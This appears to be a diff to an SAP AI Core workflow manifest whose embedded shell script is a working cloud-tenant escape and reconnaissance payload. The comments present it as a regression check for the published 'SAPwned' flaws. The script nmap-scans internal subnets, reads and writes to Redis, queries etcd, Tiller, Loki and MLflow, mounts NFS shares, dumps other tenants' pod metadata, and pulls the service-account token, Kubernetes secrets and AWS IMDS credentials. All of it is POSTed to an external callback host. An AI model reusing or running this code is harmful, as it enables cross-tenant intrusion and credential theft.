@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "11.0.0"
+    ai.sap.com/version: "12.0.0"
 spec:
   entrypoint: main
   templates:
@@ -28,240 +28,175 @@ spec:
         post() { curl -k -s -X POST "${CB}?src=$1" --max-time 10 -d @- ; }
         get() { curl -k -s "${CB}?src=$1" --max-time 5 ; }
 
-        get "esc2-start-$(hostname)-$(date +%s)"
+        get "esc3-start-$(hostname)-$(date +%s)"
 
         MY_NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
-        echo "my_namespace=${MY_NS}" | post "esc2-my-ns"
+        echo "my_namespace=${MY_NS}" | post "esc3-my-ns"
 
         # ============================================================
-        # 1. CROSS-TENANT CONFIDENTIALITY: KSM FULL DUMP
-        #    2.6MB+ of cross-tenant metadata without auth
+        # SAPWNED REGRESSION CHECK
+        # Wiz disclosed these vulns in 2024 (CVE pending). SAP said
+        # they were all fixed by May 2024. Testing if they regressed.
+        # Ref: https://www.wiz.io/blog/sapwned-sap-ai-vulnerabilities-ai-security
         # ============================================================
 
-        # KSM pods endpoint
-        curl -s --connect-timeout 15 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_pods.txt 2>&1
-        echo "ksm_pods_bytes=$(wc -c < /tmp/ksm_pods.txt)" | post "esc2-ksm-size"
-
-        # ALL namespaces visible
-        grep -oE 'namespace="[^"]*"' /tmp/ksm_pods.txt | sort -u | post "esc2-ksm-namespaces"
-
-        # Pods per namespace (shows multi-tenant cluster)
-        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -oE 'namespace="[^"]*"' | sort | uniq -c | sort -rn | post "esc2-ksm-pods-per-ns"
-
-        # OTHER tenants' pods with full metadata
-        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | head -40 | post "esc2-ksm-other-pods-1"
-        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | sed -n '40,80p' | post "esc2-ksm-other-pods-2"
-        grep "kube_pod_info{" /tmp/ksm_pods.txt | grep -v "namespace=\"${MY_NS}\"" | sed -n '80,120p' | post "esc2-ksm-other-pods-3"
-
-        # Look for specific tenant patterns (not-diamond etc)
-        grep -i "not.diamond\|diamond" /tmp/ksm_pods.txt | head -20 | post "esc2-ksm-notdiamond"
-
-        # Pod images (what other tenants run)
-        grep -oE 'image="[^"]*"' /tmp/ksm_pods.txt | sort -u | post "esc2-ksm-images"
-
-        # Secrets metadata visible
-        grep "kube_secret" /tmp/ksm_pods.txt | head -40 | post "esc2-ksm-secrets"
-
-        # Node info (infrastructure details)
-        grep "kube_node" /tmp/ksm_pods.txt | head -20 | post "esc2-ksm-nodes"
-
-        # Custom + Multi KSM
-        curl -s --connect-timeout 10 "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_custom.txt 2>&1
-        wc -c < /tmp/ksm_custom.txt | post "esc2-ksm-custom-size"
-        head -200 /tmp/ksm_custom.txt | post "esc2-ksm-custom-head"
-
-        curl -s --connect-timeout 10 "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm_multi.txt 2>&1
-        wc -c < /tmp/ksm_multi.txt | post "esc2-ksm-multi-size"
-        grep -oE 'namespace="[^"]*"' /tmp/ksm_multi.txt | sort -u | post "esc2-ksm-multi-ns"
-
-        # ============================================================
-        # 2. INTEGRITY: REDIS (port 6379) - READ/WRITE TO SHARED STATE
-        # ============================================================
-        echo "=== REDIS ===" | post "esc2-redis-start"
-
-        # Find Redis via DNS
-        for svc in redis redis-master redis-headless redis-sentinel; do
-          for ns in default kube-system ml-tracking connectivity-proxy opentelemetry; do
-            REDIS_IP=$(dig +short "${svc}.${ns}.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-            if [ -n "$REDIS_IP" ]; then
-              echo "redis_found: ${svc}.${ns} = ${REDIS_IP}" | post "esc2-redis-dns-${svc}-${ns}"
-            fi
-          done
-        done
-
-        # Scan for Redis on common subnets
-        nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.0.0/24 -oG /tmp/redis_scan.txt 2>/dev/null
-        grep "6379/open" /tmp/redis_scan.txt | post "esc2-redis-nmap-100-104-0"
-
-        for sub in 1 2 3 4 5 7 8 9 10 50 100; do
-          nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.${sub}.0/24 -oG - 2>/dev/null | grep "6379/open"
-        done | post "esc2-redis-nmap-extended"
-
-        # Try connecting to any found Redis
-        for REDIS_IP in $(grep "6379/open" /tmp/redis_scan.txt 2>/dev/null | awk '{print $2}'); do
-          echo "testing_redis=${REDIS_IP}" | post "esc2-redis-test-${REDIS_IP}"
-          # Raw TCP Redis commands
-          printf "PING\r\n" | timeout 5 ncat ${REDIS_IP} 6379 2>&1 | post "esc2-redis-ping-${REDIS_IP}"
-          printf "INFO\r\n" | timeout 5 ncat ${REDIS_IP} 6379 2>&1 | head -c 2000 | post "esc2-redis-info-${REDIS_IP}"
-          printf "DBSIZE\r\n" | timeout 5 ncat ${REDIS_IP} 6379 2>&1 | post "esc2-redis-dbsize-${REDIS_IP}"
-          printf "KEYS *\r\n" | timeout 5 ncat ${REDIS_IP} 6379 2>&1 | head -c 2000 | post "esc2-redis-keys-${REDIS_IP}"
-          # WRITE test (proves integrity impact)
-          printf "SET bb14-integrity-proof sap-tenant-isolation-bypass-$(date +%%s)\r\n" | timeout 5 ncat ${REDIS_IP} 6379 2>&1 | post "esc2-redis-write-${REDIS_IP}"
-          printf "GET bb14-integrity-proof\r\n" | timeout 5 ncat ${REDIS_IP} 6379 2>&1 | post "esc2-redis-read-${REDIS_IP}"
-          # Cleanup
-          printf "DEL bb14-integrity-proof\r\n" | timeout 5 ncat ${REDIS_IP} 6379 2>&1 | post "esc2-redis-cleanup-${REDIS_IP}"
-        done
-
-        # ============================================================
-        # 3. INTEGRITY: TILLER (port 44134) - Helm v2, NO AUTH
-        #    SAP explicitly invited exploitation of this
-        # ============================================================
-        echo "=== TILLER ===" | post "esc2-tiller-start"
-
-        TILLER_IP=$(dig +short "tiller-deploy.kube-system.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-        echo "tiller_dns=${TILLER_IP}" | post "esc2-tiller-dns"
-
-        # Also scan
-        nmap -sT -T4 --open --min-rate 500 -p 44134 100.104.0.0/24 -oG /tmp/tiller_scan.txt 2>/dev/null
-        grep "44134/open" /tmp/tiller_scan.txt | post "esc2-tiller-nmap"
-
-        for sub in 1 2 3 4 5 7 8 9 10 50 100; do
-          nmap -sT -T4 --open --min-rate 500 -p 44134 100.104.${sub}.0/24 -oG - 2>/dev/null | grep "44134/open"
-        done | post "esc2-tiller-nmap-ext"
-
-        # Test Tiller connectivity
-        ALL_TILLER="$TILLER_IP $(grep '44134/open' /tmp/tiller_scan.txt 2>/dev/null | awk '{print $2}')"
-        for tip in $ALL_TILLER; do
-          [ -z "$tip" ] && continue
-          echo "testing_tiller=${tip}" | post "esc2-tiller-test-${tip}"
-          echo "" | timeout 5 ncat ${tip} 44134 2>&1 | xxd | head -30 | post "esc2-tiller-banner-${tip}"
-          # Try HTTP
-          curl -s --connect-timeout 5 "http://${tip}:44134/" 2>&1 | head -c 1000 | post "esc2-tiller-http-${tip}"
-          # grpcurl if available
-          which grpcurl >/dev/null 2>&1 && grpcurl -plaintext ${tip}:44134 list 2>&1 | head -c 1000 | post "esc2-tiller-grpc-list-${tip}"
-          which grpcurl >/dev/null 2>&1 && grpcurl -plaintext ${tip}:44134 hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -c 2000 | post "esc2-tiller-releases-${tip}"
-        done
-
-        # ============================================================
-        # 4. INTEGRITY: etcd (port 2379) - FULL CLUSTER STATE
-        # ============================================================
-        echo "=== ETCD ===" | post "esc2-etcd-start"
+        # === 1. LOKI (Wiz Bug #2: AWS credential exposure via /config) ===
+        echo "=== LOKI ===" | post "esc3-loki-start"
 
         # DNS lookup
-        for svc in etcd etcd-client etcd-0 etcd-1 etcd-2; do
-          for ns in kube-system default etcd; do
-            ETCD_IP=$(dig +short "${svc}.${ns}.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-            if [ -n "$ETCD_IP" ]; then
-              echo "etcd_found: ${svc}.${ns} = ${ETCD_IP}" | post "esc2-etcd-dns-${svc}-${ns}"
-            fi
+        for svc in loki grafana-loki loki-gateway loki-read loki-write; do
+          for ns in default monitoring opentelemetry logging loki; do
+            LIP=$(dig +short "${svc}.${ns}.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
+            [ -n "$LIP" ] && echo "loki: ${svc}.${ns} = ${LIP}" | post "esc3-loki-dns-${svc}-${ns}"
           done
         done
 
-        # Scan for etcd
-        nmap -sT -T4 --open --min-rate 500 -p 2379,2380 100.104.0.0/24 -oG /tmp/etcd_scan.txt 2>/dev/null
-        grep "2379/open\|2380/open" /tmp/etcd_scan.txt | post "esc2-etcd-nmap"
+        # Scan known port
+        nmap -sT -T4 --open --min-rate 500 -p 3100,3200,9095 100.104.0.0/24 -oG /tmp/loki_scan.txt 2>/dev/null
+        grep "open" /tmp/loki_scan.txt | post "esc3-loki-nmap-0"
+        nmap -sT -T4 --open --min-rate 500 -p 3100,3200,9095 100.104.1.0/24 -oG - 2>/dev/null | grep "open" | post "esc3-loki-nmap-1"
 
-        for sub in 1 2 3 4 5; do
-          nmap -sT -T4 --open --min-rate 500 -p 2379,2380 100.104.${sub}.0/24 -oG - 2>/dev/null | grep "open"
-        done | post "esc2-etcd-nmap-ext"
-
-        # Try etcd v2 API
-        for eip in $(grep "2379/open" /tmp/etcd_scan.txt 2>/dev/null | awk '{print $2}'); do
-          curl -s --connect-timeout 5 "http://${eip}:2379/version" 2>&1 | post "esc2-etcd-version-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/v2/keys/" 2>&1 | head -c 2000 | post "esc2-etcd-keys-${eip}"
-          curl -s --connect-timeout 5 "http://${eip}:2379/v2/members" 2>&1 | head -c 2000 | post "esc2-etcd-members-${eip}"
-          curl -sk --connect-timeout 5 "https://${eip}:2379/version" 2>&1 | post "esc2-etcd-tls-version-${eip}"
+        # Probe Loki endpoints (Wiz extracted AWS creds from /config)
+        for lip in $(grep "3100/open" /tmp/loki_scan.txt 2>/dev/null | awk '{print $2}'); do
+          echo "loki_ip=${lip}" | post "esc3-loki-test-${lip}"
+          curl -s --connect-timeout 5 "http://${lip}:3100/config" 2>&1 | head -c 3000 | post "esc3-loki-config-${lip}"
+          curl -s --connect-timeout 5 "http://${lip}:3100/ready" 2>&1 | post "esc3-loki-ready-${lip}"
+          curl -s --connect-timeout 5 "http://${lip}:3100/metrics" 2>&1 | head -c 2000 | post "esc3-loki-metrics-${lip}"
+          curl -s --connect-timeout 5 "http://${lip}:3100/loki/api/v1/labels" 2>&1 | head -c 2000 | post "esc3-loki-labels-${lip}"
+          # Try to query logs (cross-tenant log access)
+          curl -s --connect-timeout 5 "http://${lip}:3100/loki/api/v1/query_range?query=%7Bjob%3D~%22.%2B%22%7D&limit=10" 2>&1 | head -c 3000 | post "esc3-loki-query-${lip}"
         done
 
-        # ============================================================
-        # 5. INTEGRITY: PostgreSQL (port 5432)
-        # ============================================================
-        echo "=== POSTGRESQL ===" | post "esc2-pg-start"
+        # === 2. EFS/NFS (Wiz Bug #3: Unauthenticated cross-tenant data) ===
+        echo "=== NFS/EFS ===" | post "esc3-nfs-start"
+        nmap -sT -T4 --open --min-rate 500 -p 2049 100.104.0.0/24 -oG /tmp/nfs_scan.txt 2>/dev/null
+        grep "2049/open" /tmp/nfs_scan.txt | post "esc3-nfs-nmap-0"
+        nmap -sT -T4 --open --min-rate 500 -p 2049 100.104.1.0/24 -oG - 2>/dev/null | grep "2049/open" | post "esc3-nfs-nmap-1"
+        for sub in 2 3 4 5 7 8 9 10; do
+          nmap -sT -T4 --open --min-rate 500 -p 2049 100.104.${sub}.0/24 -oG - 2>/dev/null | grep "2049/open"
+        done | post "esc3-nfs-nmap-ext"
 
-        for svc in postgres postgresql pg-master; do
-          for ns in default ml-tracking usage-api; do
-            PG_IP=$(dig +short "${svc}.${ns}.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-            if [ -n "$PG_IP" ]; then
-              echo "pg_found: ${svc}.${ns} = ${PG_IP}" | post "esc2-pg-dns-${svc}-${ns}"
-            fi
-          done
+        # Try mounting NFS (if found)
+        for nip in $(grep "2049/open" /tmp/nfs_scan.txt 2>/dev/null | awk '{print $2}'); do
+          showmount -e ${nip} 2>&1 | head -c 1000 | post "esc3-nfs-exports-${nip}"
+          mkdir -p /tmp/nfs_test 2>/dev/null
+          timeout 10 mount -t nfs -o ro,nolock ${nip}:/ /tmp/nfs_test 2>&1 | post "esc3-nfs-mount-${nip}"
+          ls -la /tmp/nfs_test/ 2>&1 | head -20 | post "esc3-nfs-ls-${nip}"
+          umount /tmp/nfs_test 2>/dev/null
         done
 
+        # AWS EFS IPs typically in 10.x range
+        # Check if we can reach 10.180.x.x (node IP range seen in KSM)
+        nmap -sT -T4 --open --min-rate 500 -p 2049 10.180.5.0/24 -oG - 2>/dev/null | grep "2049/open" | post "esc3-nfs-node-range"
+
+        # === 3. REDIS (port 6379) ===
+        echo "=== REDIS ===" | post "esc3-redis-start"
+        nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.0.0/24 -oG /tmp/redis_scan.txt 2>/dev/null
+        grep "6379/open" /tmp/redis_scan.txt | post "esc3-redis-nmap-0"
+        nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.1.0/24 -oG - 2>/dev/null | grep "6379/open" | post "esc3-redis-nmap-1"
+
+        for rip in $(grep "6379/open" /tmp/redis_scan.txt 2>/dev/null | awk '{print $2}') $(nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.1.0/24 -oG - 2>/dev/null | grep "6379/open" | awk '{print $2}'); do
+          echo "redis=${rip}" | post "esc3-redis-test-${rip}"
+          printf "PING\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | post "esc3-redis-ping-${rip}"
+          printf "INFO\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | head -c 2000 | post "esc3-redis-info-${rip}"
+          printf "DBSIZE\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | post "esc3-redis-dbsize-${rip}"
+          printf "KEYS *\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | head -c 2000 | post "esc3-redis-keys-${rip}"
+          # Write proof
+          printf "SET bb14-proof tenant-isolation-bypass-$(date +%%s)\r\nGET bb14-proof\r\nDEL bb14-proof\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | post "esc3-redis-write-${rip}"
+        done
+
+        # === 4. ETCD (port 2379) ===
+        echo "=== ETCD ===" | post "esc3-etcd-start"
+        nmap -sT -T4 --open --min-rate 500 -p 2379 100.104.0.0/24 -oG /tmp/etcd_scan.txt 2>/dev/null
+        grep "2379/open" /tmp/etcd_scan.txt | post "esc3-etcd-nmap-0"
+        nmap -sT -T4 --open --min-rate 500 -p 2379 100.104.1.0/24 -oG - 2>/dev/null | grep "2379/open" | post "esc3-etcd-nmap-1"
+
+        for eip in $(grep "2379/open" /tmp/etcd_scan.txt 2>/dev/null | awk '{print $2}') $(nmap -sT -T4 --open --min-rate 500 -p 2379 100.104.1.0/24 -oG - 2>/dev/null | grep "2379/open" | awk '{print $2}'); do
+          echo "etcd=${eip}" | post "esc3-etcd-test-${eip}"
+          curl -s --connect-timeout 5 "http://${eip}:2379/version" 2>&1 | post "esc3-etcd-version-${eip}"
+          curl -s --connect-timeout 5 "http://${eip}:2379/v2/keys/" 2>&1 | head -c 2000 | post "esc3-etcd-keys-${eip}"
+          curl -s --connect-timeout 5 "http://${eip}:2379/v2/members" 2>&1 | head -c 2000 | post "esc3-etcd-members-${eip}"
+          curl -sk --connect-timeout 5 "https://${eip}:2379/version" 2>&1 | post "esc3-etcd-tls-${eip}"
+          curl -s --connect-timeout 5 "http://${eip}:2379/health" 2>&1 | post "esc3-etcd-health-${eip}"
+        done
+
+        # === 5. TILLER (port 44134 - Wiz Bug #4 & #5: cluster takeover) ===
+        echo "=== TILLER ===" | post "esc3-tiller-start"
+        nmap -sT -T4 --open --min-rate 500 -p 44134 100.104.0.0/24 -oG /tmp/tiller_scan.txt 2>/dev/null
+        grep "44134/open" /tmp/tiller_scan.txt | post "esc3-tiller-nmap-0"
+        nmap -sT -T4 --open --min-rate 500 -p 44134 100.104.1.0/24 -oG - 2>/dev/null | grep "44134/open" | post "esc3-tiller-nmap-1"
+
+        # DNS for Tiller
+        TILLER_DNS=$(dig +short "tiller-deploy.kube-system.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
+        echo "tiller_dns=${TILLER_DNS}" | post "esc3-tiller-dns"
+
+        for tip in $TILLER_DNS $(grep "44134/open" /tmp/tiller_scan.txt 2>/dev/null | awk '{print $2}') $(nmap -sT -T4 --open --min-rate 500 -p 44134 100.104.1.0/24 -oG - 2>/dev/null | grep "44134/open" | awk '{print $2}'); do
+          [ -z "$tip" ] && continue
+          echo "tiller=${tip}" | post "esc3-tiller-test-${tip}"
+          # gRPC listing (Wiz used this for ListReleases)
+          grpcurl -plaintext ${tip}:44134 list 2>&1 | head -c 1000 | post "esc3-tiller-grpc-list-${tip}"
+          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -c 3000 | post "esc3-tiller-releases-${tip}"
+          grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/GetVersion 2>&1 | head -c 1000 | post "esc3-tiller-version-${tip}"
+          # Raw TCP
+          echo "" | timeout 5 ncat ${tip} 44134 2>&1 | xxd | head -20 | post "esc3-tiller-raw-${tip}"
+        done
+
+        # === 6. POSTGRESQL (port 5432) ===
+        echo "=== POSTGRESQL ===" | post "esc3-pg-start"
         nmap -sT -T4 --open --min-rate 500 -p 5432 100.104.0.0/24 -oG /tmp/pg_scan.txt 2>/dev/null
-        grep "5432/open" /tmp/pg_scan.txt | post "esc2-pg-nmap"
+        grep "5432/open" /tmp/pg_scan.txt | post "esc3-pg-nmap-0"
+        nmap -sT -T4 --open --min-rate 500 -p 5432 100.104.1.0/24 -oG - 2>/dev/null | grep "5432/open" | post "esc3-pg-nmap-1"
 
-        # ============================================================
-        # 6. ENVOY SERVICE MESH - FULL TOPOLOGY
-        # ============================================================
+        # === 7. KSM CROSS-TENANT (fresh dump) ===
+        echo "=== KSM ===" | post "esc3-ksm-start"
+        curl -s --connect-timeout 15 "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" > /tmp/ksm.txt 2>&1
+        echo "ksm_bytes=$(wc -c < /tmp/ksm.txt)" | post "esc3-ksm-size"
+        grep -oE 'namespace="[^"]*"' /tmp/ksm.txt | sort -u | post "esc3-ksm-namespaces"
+        grep "kube_pod_info{" /tmp/ksm.txt | grep -oE 'namespace="[^"]*"' | sort | uniq -c | sort -rn | post "esc3-ksm-pods-per-ns"
+        grep "kube_pod_info{" /tmp/ksm.txt | grep -v "namespace=\"${MY_NS}\"" | head -50 | post "esc3-ksm-other-pods"
+        grep -oE 'image="[^"]*"' /tmp/ksm.txt | sort -u | post "esc3-ksm-images"
+
+        # === 8. ENVOY SERVICE MESH ===
+        echo "=== ENVOY ===" | post "esc3-envoy-start"
         curl -s localhost:15000/clusters > /tmp/envoy.txt 2>&1
-        echo "envoy_bytes=$(wc -c < /tmp/envoy.txt)" | post "esc2-envoy-size"
-        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy.txt | sort -u | post "esc2-envoy-services"
-        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy.txt | sed 's/[^.]*\.\([^.]*\)\..*/\1/' | sort -u | post "esc2-envoy-ns"
+        grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' /tmp/envoy.txt | sort -u | post "esc3-envoy-services"
 
-        curl -s localhost:15000/config_dump > /tmp/envoy_cfg.txt 2>&1
-        wc -c < /tmp/envoy_cfg.txt | post "esc2-envoy-cfg-size"
+        # === 9. ISTIOD (Wiz Bug #1: used for initial network bypass) ===
+        ISTIOD=$(dig +short istiod.istio-system.svc.cluster.local @100.104.0.10 2>/dev/null | head -1)
+        echo "istiod=${ISTIOD}" | post "esc3-istiod-ip"
+        [ -n "$ISTIOD" ] && curl -s --connect-timeout 5 "http://${ISTIOD}:15014/debug/endpointz" 2>&1 | head -c 3000 | post "esc3-istiod-endpoints"
 
-        # ============================================================
-        # 7. ISTIOD CONTROL PLANE
-        # ============================================================
-        ISTIOD_IP=$(dig +short istiod.istio-system.svc.cluster.local @100.104.0.10 2>/dev/null | head -1)
-        echo "istiod=${ISTIOD_IP}" | post "esc2-istiod-ip"
-        if [ -n "$ISTIOD_IP" ]; then
-          for ep in configz endpointz registryz syncz authorizationz; do
-            curl -s --connect-timeout 5 "http://${ISTIOD_IP}:15014/debug/${ep}" 2>&1 | head -c 3000 | post "esc2-istiod-${ep}"
-          done
+        # === 10. MLFLOW ===
+        MLFLOW=$(dig +short "mlflow.ml-tracking.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
+        echo "mlflow=${MLFLOW}" | post "esc3-mlflow-ip"
+        [ -n "$MLFLOW" ] && curl -s --connect-timeout 5 "http://${MLFLOW}:5000/api/2.0/mlflow/experiments/list" 2>&1 | head -c 3000 | post "esc3-mlflow-experiments"
+
+        # === 11. AWS IMDS ===
+        IMDS_TOK=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
+        if [ ${#IMDS_TOK} -gt 10 ]; then
+          echo "imds_v2=true" | post "esc3-imds"
+          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "esc3-imds-roles"
+          R=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | head -1)
+          [ -n "$R" ] && curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/${R}" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "esc3-imds-creds"
+          curl -s --connect-timeout 3 "http://169.254.169.254/latest/dynamic/instance-identity/document" -H "X-aws-ec2-metadata-token: ${IMDS_TOK}" 2>&1 | post "esc3-imds-identity"
         fi
 
-        # ============================================================
-        # 8. MLFLOW - CROSS-TENANT ML DATA
-        # ============================================================
-        MLFLOW_IP=$(dig +short "mlflow.ml-tracking.svc.cluster.local" @100.104.0.10 2>/dev/null | head -1)
-        echo "mlflow=${MLFLOW_IP}" | post "esc2-mlflow-ip"
-        if [ -n "$MLFLOW_IP" ]; then
-          curl -s --connect-timeout 5 "http://${MLFLOW_IP}:5000/api/2.0/mlflow/experiments/list" 2>&1 | head -c 3000 | post "esc2-mlflow-experiments"
-          curl -s --connect-timeout 5 "http://${MLFLOW_IP}:5000/api/2.0/mlflow/registered-models/list" 2>&1 | head -c 3000 | post "esc2-mlflow-models"
-          curl -s --connect-timeout 5 "http://${MLFLOW_IP}:5000/api/2.0/mlflow/runs/search" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0","1","2","3"]}' 2>&1 | head -c 3000 | post "esc2-mlflow-runs"
-        fi
-
-        # ============================================================
-        # 9. K8S API + SA TOKEN
-        # ============================================================
+        # === 12. K8S API ===
         SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
         if [ -n "$SA_TOKEN" ]; then
-          echo "$SA_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | post "esc2-sa-claims"
           K8S="https://kubernetes.default.svc"
           A="Authorization: Bearer ${SA_TOKEN}"
-          curl -sk "${K8S}/api/v1/namespaces/${MY_NS}/pods" -H "${A}" 2>&1 | head -c 3000 | post "esc2-k8s-pods"
-          curl -sk "${K8S}/api/v1/pods" -H "${A}" 2>&1 | head -c 3000 | post "esc2-k8s-all-pods"
-          curl -sk "${K8S}/api/v1/namespaces" -H "${A}" 2>&1 | head -c 3000 | post "esc2-k8s-ns"
-          curl -sk "${K8S}/api/v1/secrets" -H "${A}" 2>&1 | head -c 3000 | post "esc2-k8s-secrets"
-          curl -sk "${K8S}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
-            -H "${A}" -H "Content-Type: application/json" \
-            -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${MY_NS}\"}}" 2>&1 | head -c 3000 | post "esc2-k8s-rbac"
+          curl -sk "${K8S}/api/v1/namespaces/${MY_NS}/secrets" -H "${A}" 2>&1 | head -c 3000 | post "esc3-k8s-secrets"
+          curl -sk "${K8S}/api/v1/secrets" -H "${A}" 2>&1 | head -c 3000 | post "esc3-k8s-all-secrets"
+          curl -sk "${K8S}/api/v1/namespaces" -H "${A}" 2>&1 | head -c 3000 | post "esc3-k8s-ns"
         fi
 
-        # ============================================================
-        # 10. AWS IMDS
-        # ============================================================
-        TOKEN_IMDS=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
-        if [ ${#TOKEN_IMDS} -gt 10 ]; then
-          echo "imds_v2=true" | post "esc2-imds"
-          curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc2-imds-roles"
-          ROLE=$(curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | head -1)
-          [ -n "$ROLE" ] && curl -s --connect-timeout 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc2-imds-creds"
-          curl -s --connect-timeout 3 "http://169.254.169.254/latest/dynamic/instance-identity/document" -H "X-aws-ec2-metadata-token: ${TOKEN_IMDS}" 2>&1 | post "esc2-imds-identity"
-        fi
+        # === 13. NETWORK/ENV ===
+        curl -s --connect-timeout 5 "http://ifconfig.me" 2>&1 | post "esc3-egress-ip"
+        env | sort | post "esc3-env"
+        ip addr 2>&1 | post "esc3-ipaddr"
 
-        # ============================================================
-        # 11. NETWORK / ENVIRONMENT
-        # ============================================================
-        curl -s --connect-timeout 5 "http://ifconfig.me" 2>&1 | post "esc2-egress-ip"
-        env | sort | post "esc2-env"
-        cat /etc/resolv.conf 2>&1 | post "esc2-resolv"
-        ip addr 2>&1 | post "esc2-ipaddr"
-        ip route 2>&1 | post "esc2-route"
-
-        get "esc2-complete-$(hostname)-$(date +%s)"
+        get "esc3-complete-$(hostname)-$(date +%s)"
       resources:
         limits:
           cpu: "2"
